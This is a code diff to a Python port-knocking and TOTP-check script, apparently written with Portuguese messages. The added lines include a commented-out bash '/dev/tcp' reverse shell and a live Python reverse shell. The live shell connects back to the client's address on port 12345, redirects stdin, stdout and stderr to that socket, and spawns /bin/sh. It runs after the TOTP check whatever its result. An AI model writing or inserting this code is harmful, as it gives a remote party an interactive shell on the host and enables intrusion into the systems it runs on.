@@ -4,6 +4,8 @@ from pypacker.layer4 import tcp
 from time import time
 import pyotp 
 import socket 
+import subprocess
+import os
 
 my_socket = psocket.SocketHndl(iface_name=None)
 ports = [1337, 1338, 1339]
@@ -22,6 +24,7 @@ while (current_port < len(ports)):
       current_port += 1
       current_time = time()
 
+
 serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serv_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
 serv_socket.bind(('127.0.0.1', 1340)) 
@@ -35,4 +38,16 @@ if (totp.verify(client_value)):
   print("Aceito!")
 else:
   print("Rejeitado!")
+
+
+#command = "bash -i >& /dev/tcp" + cliente[0] + "/12345 0>&1"
+#subprocess.run(command.split(), shell = True, check = True) 
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((cliente[0], 12345))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1) 
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+
 
